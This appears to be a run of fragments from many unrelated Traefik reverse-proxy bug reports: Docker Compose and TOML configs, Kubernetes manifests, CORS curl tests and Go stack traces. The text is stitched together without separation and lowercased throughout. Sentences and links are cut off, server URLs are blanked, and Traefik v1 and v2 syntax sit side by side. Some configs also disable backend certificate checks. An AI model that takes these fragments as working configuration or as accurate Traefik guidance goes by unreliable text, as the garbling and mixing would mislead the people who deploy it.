version: \'3\' services: lb: image: traefik:1.7.11 command: - "--api" - "--docker" ports: - "80:80" - "8080:8080" labels: - "traefik.frontend.rule=host:localhost" - "traefik.frontend.auth.basic.users=user:$$apr1$$hfjubfem$$zdbkjk872vzblxv5diqpd0" - "traefik.docker.port=8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock"
traefik arguments: `--providers.docker.endpoint=tcp://host.docker.internal:2375` docker version: ```
client: docker engine - community version: 19.03.0-beta3 api version: 1.40 go version: go1.12.4 git commit: c55e026 built: thu apr 25 19:05:10 2019 os/arch: windows/amd64 experimental: false server: docker engine - community engine: version: 19.03.0-beta3 api version: 1.40 (minimum version 1.24) go version: go1.12.4 git commit: c55e026 built: thu apr 25 19:06:34 2019 os/arch: windows/amd64 experimental: true
- docker 18.09.5 / docker-compose 1.24.0
- host centos linux release 7.6.1810 ```toml
[global] debug = true checknewversion = false sendanonymoususage = false [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.smtp] address = ":25" [entrypoints.smtp-ssl] address = ":465" [entrypoints.smtp-client] address = ":587" #[log]
# filepath = "/var/log/traefik.log"
# level = "debug" #[accesslog]
# filepath = "/var/log/traefik.access.log"
# format = "common" [accesslog.filters] statuscodes = ["200", "300-302"] retryattempts = true minduration = "10ms" [accesslog.fields] defaultmode = "keep" [accesslog.fields.names] "clientusername" = "drop" [accesslog.fields.headers] defaultmode = "keep" [accesslog.fields.headers.names] "user-agent" = "redact" "authorization" = "drop" "content-type" = "keep" [api] [ping] [providers.file] [http.middlewares.http-chain.chain] middlewares = ["redirect-https"] [http.middlewares.https-chain.chain] middlewares = ["headers-sts", "compress"] [http.middlewares.redirect-https.redirectscheme] scheme = "https" permanent = true [http.middlewares.headers-sts.headers] stsseconds = 315360000 stsincludesubdomains = true stspreload = true forcestsheader = true [http.middlewares.compress.compress] [providers.docker] defaultrule = "host(`{{ normalize .name }}.domain.tld`)" exposedbydefault = false [tlsoptions] [tlsoptions.default] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_cbc_sha256" ] [acme] email = "admin@domain.tld" storage = "acme.json" entrypoint = "https" acmelogging = true [acme.dnschallenge] provider = "route53" delaybeforecheck = 5 [[acme.domains]] main = "*.domain.tld" sans = ["domain.tld"] ```
#[mesos] # mesos server endpoint.
# you can also specify multiple endpoint for mesos:
# endpoint = "192.168.35.40:5050,192.168.35.41:5050,192.168.35.42:5050"
# endpoint = "zk://192.168.35.20:2181,192.168.35.21:2181,192.168.35.22:2181/mesos"
# default: " "
endpoint = "127.0.0.1:5050" # enable watch mesos changes.
# default: true
#watch = true # default base domain used for the frontend rules.
# can be overridden by setting the "traefik.domain" label on an application.
domain = "mesos.genouest.org" ``` by the way, examples give mesos endpoint to be * but it fails with an error, trying to set in this case, i needed to set endpoint to 127.0.0.1:5050 instead (removing
running on kubernetes ```toml # enable debug mode # # optional # default: false # debug = true # periodically check if a new version has been released
checknewversion = false # log level # # optional # default: "error" # loglevel = "warn" # entrypoints to be used by frontends that do not specify any entrypoint
# each frontend can specify its own entrypoints
# # optional # default: ["http"] # defaultentrypoints = ["http","https"] # if set to true invalid ssl certificates are accepted for backends
# this disables detection of man-in-the-middle attacks so should only be used on secure backend networks
# # optional # default: false insecureskipverify = true # entrypoints definition # # optional # default: [entrypoints] [entrypoints.http] address = ":20080" [entrypoints.https] address = ":20443" [entrypoints.https.tls] [entrypoints.traefik-admin] address = "127.0.0.1:28080" ### ping configuration [ping] entrypoint = "http" ### metrics configuration [metrics] # to enable traefik to export internal metrics to prometheus [metrics.prometheus] # buckets for latency metrics buckets=[0.1,0.3,1.2,5.0] # name of the related entry point entrypoint = "traefik-admin" # enable more detailed statistics
[metrics.statistics] # number of recent errors logged
recenterrors = 10 # traefik logs [traefiklog] filepath = "/var/log/traefik.log" format = "json" # enable access logs [accesslog] # sets the file path for the access log
if not specified, stdout will be used
# intermediate directories are created if necessary
filepath = "/var/log/traefik-access.log" format = "json" bufferingsize = 100 [accesslog.filters] statuscodes = ["500-504"] [accesslog.fields] defaultmode = "keep" [accesslog.fields.names] "clientusername" = "drop" "startutc" = "drop" [accesslog.fields.headers] defaultmode = "drop" [accesslog.fields.headers.names] "user-agent" = "keep" "x-forwarded-for" = "keep" [lifecycle] # duration to keep accepting requests prior to initiating the graceful # termination period (as defined by the `gracetimeout` option)
this # option is meant to give downstream load-balancers sufficient time to # take traefik out of rotation
requestacceptgracetimeout = "25s" # duration to give active requests a chance to finish before traefik stops
gracetimeout = "15s" [forwardingtimeouts] # dialtimeout is the amount of time to wait until a connection to a backend server can be established
dialtimeout = "5s" # responseheadertimeout is the amount of time to wait for a server\'s response headers after fully writing the request (including its body, if any)
responseheadertimeout = "180s" ############################################## # api configuration backend ############################################## [api] # name of the related entry point entrypoint = "traefik-admin" # enabled dashboard dashboard = true # enable more detailed statistics
[api.statistics] # number of recent errors logged
recenterrors = 10 ################################################################ # kubernetes ingress configuration backend ################################################################ # enable kubernetes ingress configuration backend
[kubernetes] # kubernetes server endpoint
# # optional for in-cluster configuration, required otherwise
# default: empty # # endpoint = " " # bearer token used for the kubernetes client configuration
# # optional # default: empty # # token = "my token" # path to the certificate authority file
# used for the kubernetes client configuration
# # optional # default: empty # # certauthfilepath = "/my/ca.crt" # array of namespaces to watch
# # optional # default: all namespaces (empty array)
# # namespaces = ["default", "production"] # ingress label selector to identify ingress objects that should be processed
# # optional # default: empty (process all ingresses) # # labelselector = "a and not b" # disable passhost headers
# # optional # default: false # # disablepasshostheaders = true
```
not sure if this is related, there is some websockets based requests usage and we notice errors like this in the error log: ```
{"level":"error","msg":"vulcand/oxy/forward/websocket: error dialing \\"app1....com\\": websocket: bad handshake with resp: 404 404 not found","time":"2019-05-09t21:39:51z"}
[global] checknewversion = false sendanonymoususage = false [accesslog] [serverstransport] rootcas = [ "/etc/tlscerts/ca.crt", "/etc/ssl/certs/ca-certificates.crt" ] [entrypoints] [entrypoints.ssh] address = ":2222" [entrypoints.http] address = ":8080" [entrypoints.https] address = ":8443" [providers.file] [http] [http.routers] [http.routers.http] middlewares = ["httpsredirect"] entrypoints = ["http", "https"] rule = "pathprefix(`/`)" service = "empty" [http.routers.vault] middlewares = ["basicsecurity"] entrypoints = ["https"] rule = "host(`vault.commands.example.be`)" service = "vault" [http.routers.vault.tls] [http.routers.ci] middlewares = ["basicsecurity"] entrypoints = ["https"] rule = "host(`ci.commands.example.be`)" service = "ci" [http.routers.ci.tls] [http.routers.git] middlewares = ["basicsecurity"] entrypoints = ["https"] rule = "host(`git.commands.example.be`)" service = "git" [http.routers.git.tls] [http.middlewares.httpsredirect.redirectscheme] scheme = "https" permanent = true [http.middlewares.basicsecurity.headers] stsseconds = 31536000 stsincludesubdomains = true stspreload = true forcestsheader = true framedeny = true contenttypenosniff = true [http.services] [http.services.vault] [http.services.vault.loadbalancer] passhostheader = true [[http.services.vault.loadbalancer.servers]] url = " " weight = 1 [http.services.ci] [http.services.ci.loadbalancer] passhostheader = true [[http.services.ci.loadbalancer.servers]] url = " " weight = 1 [http.services.git] [http.services.git.loadbalancer] passhostheader = true [[http.services.git.loadbalancer.servers]] url = " " weight = 1 [http.services.empty] passhostheader = true [[http.services.empty.loadbalancer.servers]] url = " " weight = 1 [tcp.routers] [tcp.routers.ssh] rule = "hostsni(`*`)" entrypoints = ["ssh"] service = "gitlab" [tcp.services] [tcp.services.gitlab.loadbalancer] [[tcp.services.gitlab.loadbalancer.servers]] address = "gitlab.default.svc.cluster.local:22" [[tls]] stores = ["default"] [tls.certificate] certfile = "/etc/tlscerts/commands.crt" keyfile = "/etc/tlscerts/commands.key" [[tls]] stores = ["default"] [tls.certificate] certfile = "/etc/tlscerts/www.crt" keyfile = "/etc/tlscerts/www.key" [tlsoptions] [tlsoptions.default] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", ] [tlsstores] [tlsstores.default] [tlsstores.default.defaultcertificate] certfile = "/etc/tlscerts/commands.crt" keyfile = "/etc/tlscerts/commands.key" ```
traefik.toml
[http] [http.middlewares] [http.middlewares.tls-only.redirectscheme] scheme = "https"
``` traefik deployment
apiversion: apps/v1
kind: daemonset
metadata: name: traefik
spec: selector: matchlabels: app: traefik template: metadata: labels: app: traefik spec: serviceaccountname: traefik-ingress-controller terminationgraceperiodseconds: 60 hostnetwork: true containers: - name: traefik image: traefik:v2.0.0-alpha4-alpine args: - --log.level=debug - --api - --ping - --accesslog - --entrypoints=name:web address::80 - --entrypoints=name:websecure address::443 - --providers.kubernetescrd - --providers.file.directory=/etc/traefik - --acme - --acme.dnschallenge - --acme.dnschallenge.provider=digitalocean - --acme.domains=*.foo.bar,foo.bar - --acme.email=foo@bar - --acme.entrypoint=websecure - --acme.storage=/var/traefik/acme.json volumemounts: - mountpath: /var/traefik name: traefik-volume - mountpath: /etc/traefik name: traefik-config env: - name: do_auth_token valuefrom: secretkeyref: name: digital-ocean key: token imagepullpolicy: ifnotpresent livenessprobe: failurethreshold: 2 httpget: path: /ping port: traefik initialdelayseconds: 10 periodseconds: 5 readinessprobe: failurethreshold: 3 httpget: path: /ping port: traefik scheme: http periodseconds: 10 resources: requests: memory: "64mi" cpu: "100m" limits: memory: "64mi" cpu: "250m" ports: - name: web containerport: 80 hostport: 80 - name: websecure containerport: 443 hostport: 443 - name: traefik containerport: 8080 securitycontext: capabilities: drop: - all add: - net_bind_service volumes: - name: traefik-volume hostpath: path: /var/traefik type: directoryorcreate - name: traefik-config configmap: name: traefik
``` ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: adminroute namespace: ingress
spec: entrypoints: - web routes: - match: host(`admin.sondabar.de`) kind: rule middlewares: - name: file.tls-only services: - name: traefik port: 8080
```
traefik deployment/daemonset:
apiversion: apps/v1
kind: daemonset
metadata: name: traefik
spec: selector: matchlabels: app: traefik template: metadata: labels: app: traefik spec: serviceaccountname: traefik-ingress-controller terminationgraceperiodseconds: 60 hostnetwork: true containers: - name: traefik image: traefik:v2.0.0-alpha4-alpine args: - --log.level=debug - --api - --ping - --accesslog - --entrypoints=name:web address::80 - --entrypoints=name:websecure address::443 - --providers.kubernetescrd - --acme - --acme.dnschallenge - --acme.dnschallenge.provider=digitalocean - --acme.domains=*.foo.bar,foo.bar - --acme.email=bla@bla.biz - --acme.entrypoint=websecure - --acme.storage=/var/traefik/acme.json volumemounts: - mountpath: /var/traefik name: traefik-volume - mountpath: /etc/traefik name: traefik-config env: - name: do_auth_token valuefrom: secretkeyref: name: digital-ocean key: token imagepullpolicy: ifnotpresent livenessprobe: failurethreshold: 2 httpget: path: /ping port: traefik initialdelayseconds: 10 periodseconds: 5 readinessprobe: failurethreshold: 3 httpget: path: /ping port: traefik scheme: http periodseconds: 10 resources: requests: memory: "64mi" cpu: "100m" limits: memory: "64mi" cpu: "250m" ports: - name: web containerport: 80 hostport: 80 - name: websecure containerport: 443 hostport: 443 - name: traefik containerport: 8080 securitycontext: capabilities: drop: - all add: - net_bind_service volumes: - name: traefik-volume hostpath: path: /var/traefik type: directoryorcreate - name: traefik-config configmap: name: traefik
``` ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: https-only namespace: ingress
spec: redirectscheme: scheme: https permanent: true
``` ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: adminroute namespace: ingress
spec: entrypoints: - web routes: - match: host(`foo.bar`) kind: rule middlewares: - name: https-only services: - name: traefik port: 8080
debug = true loglevel = "debug" [api]
entrypoint = "api" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.api] address = ":8090" [marathon] endpoint = " " domain = "marathon.localhost" exposedbydefault = true
constraints = ["tag==external"]
insecureskipverify = true defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [docker] domain = "example.com"
watch = true
exposedbydefault = false [acme]
email = "example@example.com"
storage = "acme.json"
entrypoint = "https"
onhostrule = true
[acme.dnschallenge]
provider = "cloudflare"
``` docker-compose.yml:
version: "3.7"
services: reverse-proxy: image: andthensome/traefik-external container_name: traefik-external restart: always command: --docker --metrics --metrics.prometheus ports: - "10.10.10.10:80:80" - "10.10.10.10:443:443" volumes: - /var/run/docker.sock:/var/run/docker.sock - /media/traefik/acme-external.json:/acme.json environment: cf_api_email: example@example.com cf_api_key_file: /run/secrets/cf_api_key networks: - proxy - proxy-internal - prometheus-metrics labels: - traefik.tags=internal - traefik.frontend.rule=host:traefik.example.com - traefik.port=8080 - traefik.docker.network=proxy-internal - traefik.frontend.rule=pathprefixstrip:/external - traefik.frontend.headers.contentsecuritypolicy=default-src \'self\'; script-src \'self\' \'unsafe-eval\' \'unsafe-inline\'; style-src \'self\' \'unsafe-inline\'; object-src \'none\'; frame-ancestors \'none\'; form-action \'none\'; base-uri \'self\' - traefik.frontend.headers.stsseconds=315360000 - traefik.frontend.headers.stsincludesubdomains=true - traefik.frontend.headers.customframeoptionsvalue=sameorigin - traefik.frontend.headers.browserxssfilter=true - traefik.frontend.headers.contenttypenosniff=true secrets: - cf_api_email - cf_api_key secrets: cf_api_email: file: cf_api_email.txt cf_api_key: file: cf_api_key.txt networks: proxy: name: proxy proxy-internal: name: proxy-internal prometheus-metrics: name: prometheus-metrics internal: true
``` cf_api_email.txt / cf_api_key.txt don't have any newline characters
key is 100% alphanumeric
when passing key / email as cf_api_email / cf_api_key traefik generates ssl certificate as expected.
loglevel = "debug" defaultentrypoints = ["http", "https"] insecureskipverify = true [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [entrypoints.traefik] address = ":8080" [api]
entrypoint = "traefik" # enable kubernetes ingress provider.
[kubernetes]
labelselector = "traffic-type=external"
```toml [global] checknewversion = true sendanonymoususage = true debug = true [entrypoints] [entrypoints.web] address = ":80" [log] level = "debug" [accesslog] [providers.docker] exposedbydefault = false
#swarmmode = true
version: \'3.7\' services: reverse-proxy: image: traefiklocal # the official v2.0 traefik docker image #command: --api --providers.docker # enables the web ui and tells traefik to listen to docker ports: - "80:80" # the http port - "8080:8080" # the web ui (enabled by --api) volumes: - /var/run/docker.sock:/var/run/docker.sock # so that traefik can listen to the docker events# ..
- ./traefik.toml:/etc/traefik/traefik.toml # so that traefik can listen to the docker events networks: web: whoami: image: containous/whoami # a container that exposes an api to show its ip address #deploy: labels: - "traefik.http.routers.whoami.entrypoints=web" - "traefik.http.routers.whoami.rule=host(`whoami.docker.localhost`)" - "traefik.http.routers.whoami.service=whoami" # <----- - "traefik.http.routers.whoami.middlewares=testheader" # <----- - "traefik.http.services.whoami.loadbalancer.server.port=80" - "traefik.http.middlewares.testheader.headers.accesscontrolallowmethods=get,options,put,delete" - "traefik.http.middlewares.testheader.headers.accesscontrolalloworigin=origin-list-or-null" - "traefik.http.middlewares.testheader.headers.accesscontrolmaxage=100" - "traefik.enable=true" - "traefik.port=80" networks: web: networks: web:
### curl requests:
**response options ok**
curl -x options -h 'access-control-request- headers: origin' -h 'access-control-request-method: get' -h 'origin: http:// localhost/' -h 'postman-token: 6e6b862a-4dae-40f6-927f-55d78ce31e00' -h 'cac he-control: no-cache' -i ht tp/1.1 200 ok access-control-allow-methods: get,options,put,delete access-control-allow-origin: access-control-max-age: 100 date: fri, 26 apr 2019 13:03:11 gmt content-length: 0
**actual response cors**
access-control-allow-origin: **null** **expected response**:
access-control-allow-origin: ** ```
curl -x get -h 'origin: -h 'postman-token: ffc2a96f-16ba-4266-b8f4-19d15fd3b438' -h 'cache-control: no-cache' -i ht tp/1.1 200 ok access-control-allow-origin: null content-length: 447 content-type: text/plain; charset=utf-8 date: fri, 26 apr 2019 13:05:26 gmt x-request-origin: hostname: 987f738fbb0e ip: 127.0.0.1 ip: 172.19.0.2 get / http/1.1 host: whoami.docker.localhost user-agent: curl/7.63.0 accept: */* accept-encoding: gzip cache-control: no-cache origin: postman-token: ffc2a96f-16ba-4266-b8f4-19d15fd3b438 x-forwarded-for: 192.168.56.1 x-forwarded-host: whoami.docker.localhost x-forwarded-port: 80 x-forwarded-proto: http x-forwarded-server: 031bcb4dc4eb x-real-ip: 192.168.56.1
``` another question: is it in the plan to create a config to list which origins are enabled to have cors returns?
```toml [frontends.share] backend = "share-internal" passhostheader = true [frontends.share.routes.test_1] rule = "host:share.example.org" [frontend.share.redirect] entrypoints = "https" regex = "^ " replacement = " " permanent = true [frontends.share.headers] stsseconds = 31536000 stsincludesubdomains = true stspreload = true [backends.share-internal] [backends.share-internal.servers.server1] url = " " weight = 1
opensuse leap 15.0 / x86_64 ```toml
[backends] [backends.example-backend] [backends.example-backend.servers.server1] url = " " weight = 1 [backends.example-s01.servers.server1] url = " " weight = 1 [backends.example-s02.servers.server1] url = " " weight = 1 [backends.example-s03.servers.server1] url = " " weight = 1 [backends.example-s04.servers.server1] url = " " weight = 1 [backends.example-s05.servers.server1] url = " " weight = 1 [backends.example-s06.servers.server1] url = " " weight = 1 [backends.example-s07.servers.server1] url = " " weight = 1 [backends.example-s08.servers.server1] url = " " weight = 1 [backends.example-s09.servers.server1] url = " " weight = 1 [backends.example-adm.servers.server1] url = " " weight = 1 [frontends] [frontends.example-s01] backend = "example-s01" entrypoints = [ "https" ] [frontends.example-s01.routes.main] rule = "host: example.com; pathprefix: /s01" [frontends.example-s02] backend = "example-s02" entrypoints = [ "https" ] [frontends.example-s02.routes.main] rule = "host: example.com; pathprefix: /s02" [frontends.example-s03] backend = "example-s03" entrypoints = [ "https" ] [frontends.example-s03.routes.main] rule = "host: example.com; pathprefix: /s03" [frontends.example-s04] backend = "example-s04" entrypoints = [ "https" ] [frontends.example-s04.routes.main] rule = "host: example.com; pathprefix: /s04" [frontends.example-s05] backend = "example-s05" entrypoints = [ "https" ] [frontends.example-s05.routes.main] rule = "host: example.com; pathprefix: /s05" [frontends.example-s06] backend = "example-s06" entrypoints = [ "https" ] [frontends.example-s06.routes.main] rule = "host: example.com; pathprefix: /s06" [frontends.example-s07] backend = "example-s07" entrypoints = [ "https" ] [frontends.example-s07.routes.main] rule = "host: example.com; pathprefix: /s07" [frontends.example-s08] backend = "example-s08" entrypoints = [ "https" ] [frontends.example-s08.routes.main] rule = "host: example.com; pathprefix: /s08" [frontends.example-s09] backend = "example-s09" entrypoints = [ "https" ] [frontends.example-s09.routes.main] rule = "host: example.com; pathprefix: /s09" [frontends.example-frontend] backend = "example-backend" entrypoints = [ "https", "http" ] [frontends.example-frontend.routes.main] rule = "host: example.com" [frontends.example-frontend.redirect] entrypoint = "https" ```
[global] debug = false checknewversion = false sendanonymoususage = false [log] loglevel = "debug" [providers.kubernetescrd] [entrypoints] [entrypoints.http] address = ":8000" [entrypoints.https] address = ":4443" [acme] email = "redacted@gmail.com" acmelogging = true caserver = " " storage = "acme.json" entrypoint = "https" onhostrule = false [acme.dnschallenge] provider = "cloudflare" [[acme.domains]] main = "*.ezhub.de" sans = ["ezhub.de"] ```
debug = false
loglevel = "info"
defaultentrypoints = ["https", "http"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls13" ciphersuites = ["tls_ecdhe_rsa_with_aes_128_gcm_sha256","tls_rsa_with_aes_256_gcm_sha384"]
email = "abd@def.gh"
storage = "/acme.json"
entrypoint = "https"
acmelogging = true
# production url
caserver = " " [acme.dnschallenge] provider = "cloudns" delaybeforecheck = 120
[[acme.domains]] main = "*.domain.com" sans = ["domain.com"]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) [traefik.log](
#### config
checknewversion = false
loglevel = "info" defaultentrypoints = ["http"] [entrypoints] [entrypoints.traefik-dashboard] address = ":8080" [entrypoints.http] address = ":80" [entrypoints.http.whitelist] sourcerange = ["10.0.0.0/16"] [api] dashboard = false entrypoint = "traefik-dashboard" [dynamodb] region = "eu-central-1" tablename = "proxy-subdomains" watch = true refreshseconds = 3600
``` #### backend
{ "backend": { "circuitbreaker": { "expression": "networkerrorratio() > 0.5" }, "maxconn": { "amount": 10, "extractorfunc": "request.host" }, "servers": { "device": { "url": "http:// ..." } } }, "id": "backend-1", "name": "device-1", "type": "backend"
```` #### frontend
{ "alias": [ "device-name" ], "frontend": { "backend": "device-1", "errors": { "network": { "backend": "error", "query": "/error", "status": [ "500-599" ] } }, "routes": { "paths": { "rule": "pathprefix:/health,/access_token,/webapp,/api" }, "subdomains": { "rule": "host:device-1.our-domain.de" } } }, "id": "frontend-1", "mac": "xxxxxxxxxxxx", "name": "device-1", "registered": "timestamp", "serial": 1, "type": "frontend"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
#### without debug <details>
<summary>logs</summary> ```
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: bufio.(*reader).peek( , , , , , , )
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: /usr/local/go/src/bufio/bufio.go:132 +
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: net/http.(*persistconn).readloop( )
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: /usr/local/go/src/net/http/transport.go:1645 +
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: created by net/http.(*transport).dialconn
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: /usr/local/go/src/net/http/transport.go:1338 +
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: goroutine 1611 [select, 1 minutes]:
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.(*janitor).run( , )
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1079 +
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: created by github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.runjanitor
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal traefik[7108]: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1099 +
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal systemd[1]: traefik.service: main process exited, code=exited, status=2/invalidargument
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal systemd[1]: unit traefik.service entered failed state.
apr 01 11:21:35 ip-10-0-30-22.eu-central-1.compute.internal systemd[1]: traefik.service failed.
#### with debug
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/server/server_signals.go:18 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/server.(*server).start.func3( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/server/server.go:259 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.(*pool).go.func1()
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/safe.gowithrecover
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 32 [chan receive, 10 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/provider/dynamodb.(*provider).provide.func2.1()
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/provider/dynamodb/dynamodb.go:164 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/safe.gowithrecover
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 45 [select, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/server.(*server).throttleproviderconfigreload( , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/server/server_configuration.go:459 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/server.(*server).preloadconfiguration.func1( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/server/server_configuration.go:328 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.(*pool).go.func1()
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/safe.gowithrecover
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 46 [select, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/vendor/github.com/eapache/channels.(*ringchannel).ringbuffer( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:87 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/vendor/github.com/eapache/channels.newringchannel
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:32 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 47 [select]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/server.(*server).throttleproviderconfigreload.func1( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/server/server_configuration.go:446 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.(*pool).go.func1()
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/safe.gowithrecover
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 188 [select, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.(*janitor).run( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1079 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.runjanitor
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1099 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 187 [select, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.(*janitor).run( , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1079 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by github.com/containous/traefik/vendor/github.com/patrickmn/go-cache.runjanitor
apr 15 08:27:06 ip-10-0-63-244 traefik: /go/src/github.com/containous/traefik/vendor/github.com/patrickmn/go-cache/cache.go:1099 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 197 [io wait, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: internal/poll.runtime_pollwait( , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/runtime/netpoll.go:173 +
apr 15 08:27:06 ip-10-0-63-244 traefik: internal/poll.(*polldesc).wait( , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
apr 15 08:27:06 ip-10-0-63-244 traefik: internal/poll.(*polldesc).waitread( , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
